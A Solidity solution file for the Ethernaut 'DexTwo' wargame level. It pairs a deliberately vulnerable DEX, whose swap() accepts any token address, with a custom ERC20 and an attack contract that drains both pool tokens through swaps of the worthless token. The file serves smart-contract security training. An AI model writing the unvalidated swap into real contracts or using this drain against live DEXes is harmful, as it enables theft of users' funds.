// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title DexTwo (Ethernaut Level 23)
 * @notice Similar to Dex but without the token validation in swap().
 *         This allows swapping with any token, enabling a drain attack
 *         using a custom malicious token.
 */
contract DexTwo {
    address public token1;
    address public token2;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setTokens(address _token1, address _token2) public {
        require(msg.sender == owner, "Not owner");
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public {
        require(msg.sender == owner, "Not owner");
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        // NOTE: No validation that from/to are token1 or token2!
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return (amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this));
    }

    function approve(address spender, uint256 amount) public {
        IERC20(token1).approve(spender, amount);
        IERC20(token2).approve(spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

/**
 * @title MaliciousToken
 * @notice A custom ERC20 token used to exploit DexTwo.
 */
contract MaliciousToken is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

/**
 * @title DexTwoAttack
 * @notice Exploit: Create a malicious token, send some to DexTwo, then swap
 *         the malicious token for token1 and token2 to drain both.
 *         Since swap() doesn't validate token addresses, any ERC20 can be used.
 */
contract DexTwoAttack {
    DexTwo public dex;
    address public token1;
    address public token2;

    constructor(address _dex) {
        dex = DexTwo(_dex);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    function attack() external {
        // Deploy malicious token with enough supply
        MaliciousToken evil = new MaliciousToken("Evil", "EVL", 400);

        // Send 100 evil tokens to the dex (so dex balance of evil = 100)
        evil.transfer(address(dex), 100);

        // Approve dex to spend our evil tokens
        evil.approve(address(dex), type(uint256).max);

        // Swap 100 evil for all of token1 (price = 100 * 100 / 100 = 100)
        dex.swap(address(evil), token1, 100);

        // Now dex has 200 evil tokens. Swap 200 evil for all of token2
        dex.swap(address(evil), token2, 200);
    }
}
